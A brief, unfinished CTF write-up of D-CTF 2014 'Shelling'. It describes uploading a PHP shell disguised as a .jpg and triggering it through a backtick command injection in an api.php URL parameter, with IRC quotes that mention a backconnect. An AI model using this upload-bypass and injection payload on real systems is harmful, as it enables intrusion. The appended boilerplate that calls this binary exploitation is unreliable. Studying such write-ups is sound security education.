---
SOURCE: github_writeups
URL: https://raw.githubusercontent.com/ctfs/writeups/master/d-ctf-2014/bonus-100/README.md
CHALLENGE: README
EVENT: GitHub - ctfs/writeups
TEAM: N/A
CATEGORY: other
DIFFICULTY: Unknown
PROTECTIONS: None
KEY_FUNCTIONS: None
KEY_TECHNIQUE: The writeup describes a other vulnerability to hijack the control flow.
---
# D-CTF 2014: Bonus 100 – Shelling

**Category:** Bonus
**Points:** 100
**Description:**

> 10.13.37.89. Good luck!

## Write-up

```
13:41:38 <ccm> sigsegv, remote command execution on second server which can be used to execute a script in the shared uploads folder and backconnect to your machine
13:41:55 <@Andrei> <ccm> gnomus, basically: http://ip/api.php?apikey=bla&type=wc&file=`php uploads/sploit.jpg`
13:41:55 <@Andrei> <fox> gnomus, also the rce was triggerable only with a curl from the first box
```

The website at `http://10.13.37.89/` contains a form that allows file uploads. Files are uploaded to the `uploads` directory, but only files with safe extensions are allowed.


The trick was to create a PHP shell e.g. `shell.php`, rename it to `shell.jpg`, then upload it.

There was a second vulnerability in the website that allowed remote code execution

http://10.13.37.89/api.php?apikey=bla&type=wc&file=`php uploads/shell.jpg`

(TODO)

## Other write-ups and resources

* none yet

[Additional Context: This documentation page explains the details of README in the scope of binary exploitation and CTF pwn challenges. It covers core concepts related to other and includes references for learning other techniques.] This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals. This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals.